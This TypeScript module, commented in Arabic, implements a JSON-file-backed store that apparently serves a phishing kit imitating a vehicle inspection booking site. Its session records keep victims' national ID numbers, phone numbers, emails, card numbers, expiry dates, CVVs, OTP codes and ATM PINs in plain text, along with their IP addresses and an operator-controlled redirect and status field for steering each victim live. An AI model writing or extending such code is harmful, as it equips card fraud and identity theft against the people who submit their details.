// قاعدة بيانات في الذاكرة مع حفظ على ملف JSON
// تعمل على جميع البيئات بدون native binaries

import fs from 'fs';
import path from 'path';

const DB_DIR = process.env.DB_PATH || '/tmp';
const DB_FILE = path.join(DB_DIR, 'vsc_data.json');

interface Session {
  id: string;
  country: string;
  ip: string;
  name: string;
  id_number: string;
  plate_number: string;
  booking_date: string;
  phone: string;
  email: string;
  card_number: string;
  card_expiry: string;
  card_cvv: string;
  card_holder: string;
  otp_code: string;
  atm_pin: string;
  current_page: string;
  status: string;
  is_new: number;
  redirect_to: string;
  created_at: number;
  updated_at: number;
}

interface Visit {
  id: number;
  session_id: string;
  page: string;
  country: string;
  ip: string;
  visited_at: number;
}

interface ActiveUser {
  session_id: string;
  last_ping: number;
}

interface DbData {
  sessions: Record<string, Session>;
  visits: Visit[];
  active_users: Record<string, ActiveUser>;
  visit_counter: number;
}

let dbData: DbData = {
  sessions: {},
  visits: [],
  active_users: {},
  visit_counter: 0,
};

let loaded = false;

function loadData() {
  if (loaded) return;
  loaded = true;
  try {
    if (fs.existsSync(DB_FILE)) {
      const raw = fs.readFileSync(DB_FILE, 'utf-8');
      const parsed = JSON.parse(raw);
      dbData.sessions = parsed.sessions || {};
      dbData.visits = parsed.visits || [];
      dbData.active_users = parsed.active_users || {};
      dbData.visit_counter = parsed.visit_counter || 0;
    }
  } catch {
    // ابدأ بقاعدة بيانات فارغة
  }
}

function saveData() {
  try {
    fs.mkdirSync(DB_DIR, { recursive: true });
    fs.writeFileSync(DB_FILE, JSON.stringify(dbData), 'utf-8');
  } catch {
    // تجاهل أخطاء الحفظ
  }
}

loadData();

type PreparedStatement = {
  get: (...params: unknown[]) => unknown;
  all: (...params: unknown[]) => unknown[];
  run: (...params: unknown[]) => void;
};

function prepare(sql: string): PreparedStatement {
  const normalized = sql.replace(/\s+/g, ' ').trim();

  return {
    get: (...params: unknown[]) => executeGet(normalized, params),
    all: (...params: unknown[]) => executeAll(normalized, params),
    run: (...params: unknown[]) => {
      executeRun(normalized, params);
      saveData();
    },
  };
}

function executeGet(sql: string, params: unknown[]): unknown {
  const upper = sql.toUpperCase();

  // SELECT * FROM sessions WHERE id = ?
  if (upper.includes('FROM SESSIONS') && upper.includes('WHERE') && upper.includes('ID = ?')) {
    const id = params[0] as string;
    return dbData.sessions[id] || null;
  }

  // SELECT redirect_to, status FROM sessions WHERE id = ?
  if (upper.includes('SELECT REDIRECT_TO') && upper.includes('FROM SESSIONS')) {
    const id = params[0] as string;
    const s = dbData.sessions[id];
    if (!s) return null;
    return { redirect_to: s.redirect_to || '', status: s.status };
  }

  // SELECT COUNT(*) as count FROM active_users WHERE last_ping > ?
  if (upper.includes('COUNT') && upper.includes('ACTIVE_USERS')) {
    const threshold = params[0] as number;
    const count = Object.values(dbData.active_users).filter(u => u.last_ping > threshold).length;
    return { count };
  }

  // SELECT COUNT(*) as count FROM visits
  if (upper.includes('COUNT') && upper.includes('VISITS')) {
    return { count: dbData.visits.length };
  }

  return null;
}

function executeAll(sql: string, _params: unknown[]): unknown[] {
  const upper = sql.toUpperCase();

  // SELECT * FROM sessions ORDER BY updated_at DESC
  if (upper.includes('FROM SESSIONS')) {
    const sessions = Object.values(dbData.sessions);
    sessions.sort((a, b) => b.updated_at - a.updated_at);
    return sessions;
  }

  // SELECT * FROM active_users WHERE last_ping > ?
  if (upper.includes('FROM ACTIVE_USERS')) {
    const threshold = _params[0] as number || 0;
    return Object.values(dbData.active_users).filter(u => u.last_ping > threshold);
  }

  // SELECT * FROM visits
  if (upper.includes('FROM VISITS')) {
    return dbData.visits;
  }

  return [];
}

function executeRun(sql: string, params: unknown[]): void {
  const upper = sql.toUpperCase();

  // INSERT INTO sessions (...)
  if (upper.startsWith('INSERT') && upper.includes('INTO SESSIONS')) {
    const p = params as unknown[];
    const [id, country, ip, name, id_number, plate_number, booking_date, phone, email,
           card_number, card_expiry, card_cvv, card_holder, otp_code, atm_pin,
           current_page, created_at, updated_at] = p as [
      string, string, string, string, string, string, string, string, string,
      string, string, string, string, string, string, string, number, number
    ];
    dbData.sessions[id] = {
      id, country: country || '', ip: ip || '',
      name: name || '', id_number: id_number || '',
      plate_number: plate_number || '', booking_date: booking_date || '',
      phone: phone || '', email: email || '',
      card_number: card_number || '', card_expiry: card_expiry || '',
      card_cvv: card_cvv || '', card_holder: card_holder || '',
      otp_code: otp_code || '', atm_pin: atm_pin || '',
      current_page: current_page || 'home',
      status: 'active', is_new: 1, redirect_to: '',
      created_at: created_at || Date.now(),
      updated_at: updated_at || Date.now(),
    };
    return;
  }

  // UPDATE sessions SET status = ?, redirect_to = ?, updated_at = ? WHERE id = ?
  if (upper.startsWith('UPDATE') && upper.includes('SESSIONS SET') && upper.includes('STATUS') && upper.includes('REDIRECT_TO')) {
    const [status, redirect_to, updated_at, id] = params as [string, string, number, string];
    const s = dbData.sessions[id];
    if (!s) return;
    s.status = status || 'active';
    s.redirect_to = redirect_to || '';
    s.updated_at = updated_at || Date.now();
    return;
  }

  // UPDATE sessions SET redirect_to = ?, is_new = 0, updated_at = ? WHERE id = ?
  if (upper.startsWith('UPDATE') && upper.includes('SESSIONS') && upper.includes('REDIRECT_TO') && upper.includes('IS_NEW')) {
    const id = params[params.length - 1] as string;
    const s = dbData.sessions[id];
    if (!s) return;
    s.redirect_to = params[0] as string || '';
    s.is_new = 0;
    s.updated_at = params[1] as number || Date.now();
    return;
  }

  // UPDATE sessions SET field = ?, ... WHERE id = ? (dynamic update from session route)
  if (upper.startsWith('UPDATE') && upper.includes('SESSIONS SET')) {
    const id = params[params.length - 1] as string;
    const s = dbData.sessions[id];
    if (!s) return;

    // استخراج أسماء الحقول من الـ SQL
    const setMatch = sql.match(/SET\s+(.+)\s+WHERE/i);
    if (!setMatch) return;

    const setClauses = setMatch[1].split(',').map(c => c.trim());
    let paramIdx = 0;

    for (const clause of setClauses) {
      const eqIdx = clause.indexOf('=');
      if (eqIdx === -1) continue;
      const fieldName = clause.substring(0, eqIdx).trim().toLowerCase();
      const valueExpr = clause.substring(eqIdx + 1).trim();

      if (valueExpr === '?') {
        const value = params[paramIdx++];
        if (fieldName in s) {
          (s as Record<string, unknown>)[fieldName] = value;
        }
      } else if (valueExpr === '1' || valueExpr === '0') {
        if (fieldName in s) {
          (s as Record<string, unknown>)[fieldName] = parseInt(valueExpr);
        }
      }
    }
    return;
  }

  // INSERT INTO visits (...)
  if (upper.startsWith('INSERT') && upper.includes('INTO VISITS')) {
    const [session_id, page, country, ip, visited_at] = params as [string, string, string, string, number];
    dbData.visit_counter++;
    dbData.visits.push({
      id: dbData.visit_counter,
      session_id: session_id || '',
      page: page || '',
      country: country || '',
      ip: ip || '',
      visited_at: visited_at || Date.now(),
    });
    // الاحتفاظ بآخر 10000 زيارة فقط
    if (dbData.visits.length > 10000) {
      dbData.visits = dbData.visits.slice(-10000);
    }
    return;
  }

  // INSERT OR REPLACE INTO active_users (...)
  if (upper.startsWith('INSERT') && upper.includes('ACTIVE_USERS')) {
    const [session_id, last_ping] = params as [string, number];
    dbData.active_users[session_id] = { session_id, last_ping: last_ping || Date.now() };
    return;
  }

  // UPDATE active_users SET last_ping = ? WHERE session_id = ?
  if (upper.startsWith('UPDATE') && upper.includes('ACTIVE_USERS')) {
    const session_id = params[params.length - 1] as string;
    if (dbData.active_users[session_id]) {
      dbData.active_users[session_id].last_ping = params[0] as number || Date.now();
    }
    return;
  }
}

export default function getDb() {
  return { prepare };
}
